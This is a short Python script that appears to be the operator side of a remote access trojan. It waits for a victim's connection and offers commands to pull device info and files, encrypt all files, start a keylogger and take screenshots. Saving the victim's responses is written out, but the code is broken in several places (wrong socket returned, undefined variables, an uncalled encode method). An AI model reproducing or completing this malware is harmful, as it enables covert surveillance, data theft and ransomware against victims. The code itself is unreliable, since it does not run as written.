import socket
connected = True

def Connections():
    HOST = '127.0.0.1'
    PORT = 6654
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((HOST,PORT))
    sock.listen()
    print('[*] Waiting For Connection . . .\n')
    cli, addr = sock.accept()
    print(f'Got Connection From {addr}\n')
    return sock
def menu():
    print('1. Get Device Info')
    print('2. See All Images/Videos (12. See All Files)')
    print('3. Encrypt All Files')
    print('4. Start Keylogger')
    print('5 Take Screenshot')
def handle_commands(sock):
    file_size = b''
    command = input('>>> ').strip()
    if command == '1':
        comand = sock.send(command.encode())
        remaining = file_size
        with open("received_file.bin", "wb") as f:
            while remaining > 0:
                chunk = sock.recv(min(4096, remaining))
                if not chunk:
                    raise ConnectionError("Connection closed")
                f.write(chunk)
                remaining -= len(chunk)
    elif command == '2':
        comand = sock.send(command.encode())
        with open("received_file.bin", "wb") as f:
            while remaining > 0:
                chunk = sock.recv(min(4096, remaining))
                if not chunk:
                    raise ConnectionError("Connection closed")
                f.write(chunk)
                remaining -= len(chunk)
    elif command == '3':
        comand = sock.send(command.encode)
        with open("received_file.bin", "wb") as f:
            while remaining > 0:
                chunk = sock.recv(min(4096, remaining))
                if not chunk:
                    raise ConnectionError("Connection closed")
                f.write(chunk)
                remaining -= len(chunk)
def main():
    sock = Connections()
    while connected:
        menu()
        handle_commands(sock)
main()
